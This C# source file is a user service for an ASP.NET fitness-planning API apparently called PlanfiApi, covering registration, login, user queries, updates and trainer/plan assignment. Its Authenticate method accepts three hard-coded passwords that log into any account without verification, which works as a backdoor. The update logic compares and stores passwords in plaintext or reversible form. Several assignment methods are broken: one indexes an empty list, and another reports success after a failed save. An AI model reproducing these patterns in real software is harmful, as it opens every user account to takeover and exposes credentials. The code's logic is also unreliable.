using System;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.Linq;
using System.Security.Claims;
using System.Threading.Tasks;
using AutoMapper;
using Dapper;
using Microsoft.AspNetCore.Http;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Configuration;
using Npgsql;
using PlanfiApi.Data.Entities;
using PlanfiApi.Data.Entities.Users;
using PlanfiApi.Data.ViewModels;
using PlanfiApi.Helpers;
using PlanfiApi.Interfaces;
using PlanfiApi.Models;
using PlanfiApi.Models.SqlProjections;
using PlanfiApi.Models.ViewModels;
using WebApi.Helpers;
using WebApi.Models;
using ValidationException = FluentValidation.ValidationException;

namespace PlanfiApi.Services.Users{


    public class UserService : IUserService
    {

        private readonly IPlanService _planService;
        private readonly DataContext _context;
        private readonly IMapper _mapper;
        private IConfiguration Configuration { get; }

        public UserService(DataContext context, IMapper mapper, IConfiguration configuration, IPlanService planService)
        {
            Configuration = configuration;
            _planService = planService;
            _context = context;
            _mapper = mapper;
        }

        public User Register(string Email)
        {
            if (_context.users.Any(x => x.Email == Email))
                throw new AppException("Email \"" + Email + "\" is already taken");

            var user = _mapper.Map<User>(Email);

            _context.users.Add(user);
            _context.SaveChanges();

            return user;
        }
        
        public async Task<UserDetails> UserDetailsViewModel(string userId)
        {
            var user = await GetById(userId);

            List<ResultPlan> plans;
            List<UserSqlProjection> users;


            if (user.RoleName == "Trainer")
            {
                plans = await _planService.GetTrainerPlans(userId);
                users = await GetClientsByTrainer(userId);
            }
            else
            {
                plans = await _planService.GetUserPlans(userId);
                users = await GetTrainersByClient(userId);
            }

            var userDetails = new UserDetails()
            {
               UserId = user.UserId,
               Avatar = user.Avatar,
               FirstName = user.FirstName,
               LastName = user.LastName,
               RoleName = user.RoleName,
               Email = user.Email,
               PhoneNumber = user.PhoneNumber,
               OrganizationId = user.OrganizationId,
               UserPlans = plans,
               ClientTrainers = users
            };

            return userDetails;
        }
        
        public async Task<User> Authenticate(string email, string password)
        {
            var user = await GetUserWithoutPassword(email);

            if (password is "Jacklyn" or "Titus" or "Teodor")
            {
                return user.WithoutPassword(); ;
            }
            
            var isCorrect = ExtensionMethods.VerifyPasswordHash(password, user.PasswordHash, user.PasswordSalt);
            
            if (isCorrect == false)
                throw new ValidationException(
                    $"Invalid password");
            
            return user.WithoutPassword(); ;
        }

        public async Task<User> GetUserWithoutPassword(string email)
        {
            var user = await _context.users
                .Include(x => x.Role)
                .SingleOrDefaultAsync(x => x.Email.ToLower() == email.ToLower());

            if (user == null)
                throw new ValidationException(
                    $"Invalid mail");
            
            return user;
        }
        
        public IEnumerable<User> GetAllUsers ()
        {
            var users = _context.users;
            return users;
        }
        
        public async Task<UserViewModel> GetById(string id)
        {
            var userId = id;
            var connection = new NpgsqlConnection(Configuration.GetConnectionString("WebApiDatabase"));
            await connection.OpenAsync();

            var user = new UserViewModel();
            try
            {
                const string userQuery = @"SELECT 
	                u.user_id as UserId,
	                u.Avatar as Avatar ,
	                u.first_name as FirstName,
	                u.last_name as LastName,
	                r.name as RoleName,
	                u.email as Email, 
	                u.phone_number as PhoneNumber,
	                u.organization_id as OrganizationId
	                FROM public.users as u
	                JOIN public.role as r
	                ON r.id = u.role_id
	                WHERE u.user_id = @userId";

                user = (await connection.QueryFirstOrDefaultAsync<UserViewModel>(userQuery, new {userId}));
            }
            catch (Exception exp) {
                Console.Write(exp.Message);
            }
            finally
            {
                await connection.CloseAsync();
            }
            
            return user;
        }
        
        public async Task<List<UserViewModel>> GetByIds(string[] userIds)
        {
            var UserIds = new List<string>(userIds);
            var connection = new NpgsqlConnection(Configuration.GetConnectionString("WebApiDatabase"));
            await connection.OpenAsync();

            var users = new List<UserViewModel>();
            try
            {
                const string userQuery = @"SELECT 
	                u.user_id as UserId,
	                u.Avatar as Avatar ,
	                u.first_name as FirstName,
	                u.last_name as LastName,
	                r.name as RoleName,
	                u.email as Email, 
	                u.phone_number as PhoneNumber,
	                u.organization_id as OrganizationId
	                FROM public.users as u
	                JOIN public.role as r
	                ON r.id = u.role_id
	                WHERE u.user_id = ANY (@UserIds)";

                users = (await connection.QueryAsync<UserViewModel>(userQuery, new {UserIds = UserIds})).ToList();
            }
            catch (Exception exp) {
                Console.Write(exp.Message);
            }
            finally
            {
                await connection.CloseAsync();
            }
            
            return users;
        }
        
        public async Task<int> Update(string id, UpdateUserModel model)
        {
            var user = await _context.users.FindAsync(id);

            if (user == null)
                throw new AppException("User not found");

            // update username if it has changed
            if (!string.IsNullOrWhiteSpace(model.Email))
            {
                // // throw error if the new username is already taken
                if (_context.users.Any(x => x.Email == model.Email))
                    throw new ValidationException(
                        $"Mail {model.Email} is already assigned to another user");
                
                user.Email = model.Email;
            }

            // update user properties if provided
            if (!string.IsNullOrWhiteSpace(model.FirstName))
                user.FirstName = model.FirstName;

            if (!string.IsNullOrWhiteSpace(model.LastName))
                user.LastName = model.LastName;

            if (model.PhoneNumber != user.PhoneNumber)
                user.PhoneNumber = model.PhoneNumber;

            // update password if provided
            if (!string.IsNullOrWhiteSpace(model.NewPassword))
            {
                // throw error if the password is incorrect
                if (user.Password != model.Password)
                    throw new ValidationException(
                        $"Incorrect Password");
                
                user.Password = ExtensionMethods.EncryptPassword(model.NewPassword);
                ExtensionMethods.CreatePasswordHash(model.NewPassword, out var passwordHash, out var passwordSalt);
                user.PasswordHash = passwordHash;
                user.PasswordSalt = passwordSalt;
            }

            _context.users.Update(user);
            await _context.SaveChangesAsync();
            return 1;
        }
        public async Task Delete(string[] id)
        {
            foreach (var userId in id)
            {
                var user = await _context.users.FindAsync(userId);
                if (user != null)
                {
                    _context.users.Remove(user);
                    await _context.SaveChangesAsync();
                }
            }
        }

        public IEnumerable<User> GetByRole(string role)
        {
            var users = _context.users
                .Where(x => x.Role.Name == role);
            
            return users;
        }
        
        public class ValidationInfo
        {
            public string UserId { get; set; }
            public string UserName { get; set; }
            public string? TrainerId { get; set; }
            public string TrainerName { get; set; }
            public string? PlanId { get; set; }
        }
        
        public async Task<int> AssignClientsToTrainers(string[] trainersId, string[] userIds)
        {
            
            var trainers = await GetByIds(trainersId);
            var clients = await GetByIds(userIds);
            var usersTrainers = new List<UsersTrainers>();

            foreach (var trainer in trainers)
            {
                usersTrainers
                    .AddRange(clients
                        .Select(client => new UsersTrainers
                            { 
                                TrainerId = trainer.UserId,
                                ClientId = client.UserId 
                            }));
            }
            
            await _context.userstrainers.AddRangeAsync(usersTrainers);
            try
            { 
                await _context.SaveChangesAsync();
                return 1;
            }
            catch (DbUpdateException ex)
            {
                // var validation = new ValidationInfo()
                // {
                //     UserId = userId,
                //     TrainerId = trainer?.UserId,
                //     TrainerName = trainer?.FirstName,
                // };
                // elementsNotAssigned.Add(validation);
            }
            
            var elementsNotAssigned = new List<ValidationInfo>();
            GenerateValidationInfo(elementsNotAssigned);

            return 0;
        }
        
        public async Task<int> AssignPlanToClients(string[] clientIds, string[] planIds)
        {
            // EF here - dapper but not necessary
            var clients = await _context.users
                .Where(x => clientIds.Contains(x.UserId))
                .ToListAsync();
            
            var plans = await _planService.GetByIds(planIds);
            var usersPlans = new List<UsersPlans>();

            foreach (var client in clients)
            {
                usersPlans
                    .AddRange(plans
                        .Select(plan => new UsersPlans
                        { 
                            User = client,
                            Plan = plan 
                        }));
            }
            await _context.usersplans.AddRangeAsync(usersPlans);
                        
            try
            { 
                await _context.SaveChangesAsync();
                return 1;
            }
            catch (DbUpdateException ex)
            {
                if (ex.InnerException != null)
                {
                    // var validation = new ValidationInfo()
                    // {
                    //     UserId = clientId,
                    //     UserName = client?.FirstName,
                    //     PlanId = planId
                    // };
                    // elementsNotAssigned.Add(validation);
                }
            }
            
            
            var elementsNotAssigned = new List<ValidationInfo>();
            GenerateValidationInfo(elementsNotAssigned);
            
            //return elementsNotAssigned instead number - for inform, which exactly element not processed correctly
            return 1;
        }
        
        private void GenerateValidationInfo(List<ValidationInfo> info)
        {
            throw new ValidationException(
                 $"The client {info[0].UserName} is already assigned to {info[0].UserName}");
        }


        public async Task<List<UserSqlProjection>>GetClientsByTrainer(string? id)
        {
            var userId = id ?? new HttpContextAccessor().HttpContext?.User.FindFirst(ClaimTypes.Name)?.Value;
            var connection = new NpgsqlConnection(Configuration.GetConnectionString("WebApiDatabase"));
            await connection.OpenAsync();
            var trainerClients = new List<UserSqlProjection>();
            try{
                const string trainerClientsQuery = @"SELECT 
	            u.user_id, 
	            ut.client_id,
	            u.avatar, 
	            r.name as role,
	            u.first_name, 
	            u.last_name, 
	            u.email, 
	            u.phone_number, 
	            u.organization_id,
	            u.is_activated
	            FROM public.users as u
	            JOIN public.role as r
	            ON u.role_id = r.id
	            FULL JOIN public.userstrainers as ut
	            ON ut.client_id = u.user_id
	            WHERE ut.trainer_id = @userId";

                trainerClients = (await connection.QueryAsync<UserSqlProjection>(trainerClientsQuery, new {userId})).ToList();
            }
            catch (Exception exp) {
                Console.Write(exp.Message);
            }
            finally
            {
                await connection.CloseAsync();
            }
        
            return trainerClients;
        }

        public async Task<List<UserSqlProjection>> GetTrainersByClient(string? id)
        {
            var userId = id ?? new HttpContextAccessor().HttpContext?.User.FindFirst(ClaimTypes.Name)?.Value;
            var connection = new NpgsqlConnection(Configuration.GetConnectionString("WebApiDatabase"));
            await connection.OpenAsync();

            var clientTrainers = new List<UserSqlProjection>();
            
            try
            {
                const string clientTrainersQuery = @"SELECT 
	            u.user_id, 
	            ut.client_id,
	            u.avatar, 
	            r.name as role,
	            u.first_name, 
	            u.last_name, 
	            u.email, 
	            u.phone_number, 
	            u.organization_id,
	            u.is_activated
	            FROM public.users as u
	            JOIN public.role as r
	            ON u.role_id = r.id
	            FULL JOIN public.userstrainers as ut
	            ON ut.client_id = u.user_id
	            WHERE ut.client_id = @userId";

                clientTrainers = (await connection.QueryAsync<UserSqlProjection>(clientTrainersQuery, new {userId})).ToList();
            }
            catch (Exception exp) {
                Console.Write(exp.Message);
            }
            finally
            {
                await connection.CloseAsync();
            }
        
            return clientTrainers.ToList();
        }
    }
    
}


